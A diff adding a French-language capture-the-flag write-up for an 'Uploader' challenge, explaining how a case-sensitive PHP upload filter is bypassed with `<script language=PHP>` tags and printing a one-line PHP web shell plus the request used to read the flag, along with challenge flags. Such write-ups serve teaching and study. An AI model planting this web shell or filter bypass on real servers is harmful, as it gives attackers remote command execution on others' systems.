@@ -329,9 +329,25 @@ From there on it's simply a matter of filling in the letters stored in .text int
 
 > MMA{fc7d90ca001fc8712497d88d9ee7efa9e9b32ed8}
 
+********************
+## [Uploader](http://score.mmactf.link/problems/31?locale=en) *100*
+by vic511
+********************
+
+Dans ce challenge, le but &eacute;tait d'uploader un script PHP, `/<\?|php/` &eacute;tant la regex filtrant les expressions interdites.
+Apr&egrave;s une petite recherche sur la doc, une note (&agrave; -29 points, comme quoi...) nous indique que l'on peut utiliser `<script language=PHP></script>` comme tags d'ouverture, le mot PHP &eacute;tant en majuscule, et la regex n'&eacute;tant pas case insensitive, alors il ne sera pas enlev&eacute;. Ainsi il suffit d'uploader un script du type:
+
+```php
+<script language=PHP>system($_GET["c"]);</script>
+```
+
+On a donc une RCE, apr&egrave;s avoir fouill&eacute; sur le serveur on trouve le fichier flag &agrave; la racine de ce dernier :
+http://recocta.chal.mmactf.link:9080/u/truc.php?c=cat%20/flag
+
+> Le flag est "MMA{you can run php from script tag}"
 
 ******************
-Upload, Splitted and RPS coming soon
+Splitted and RPS coming soon
 ******************
 
 **********************
